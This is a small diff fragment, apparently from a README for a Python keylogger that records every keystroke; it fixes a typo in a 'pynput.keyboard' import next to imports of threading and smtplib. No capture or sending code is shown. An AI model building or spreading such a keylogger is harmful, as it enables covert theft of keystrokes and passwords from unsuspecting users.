@@ -19,7 +19,7 @@ This keylogger programm records all key strikes that entered on the keyboard. Th
 
 #!/usr/bin/env python
 
-import pynput.keyboar
+import pynput.keyboard
 import threading
 import smtplib
 
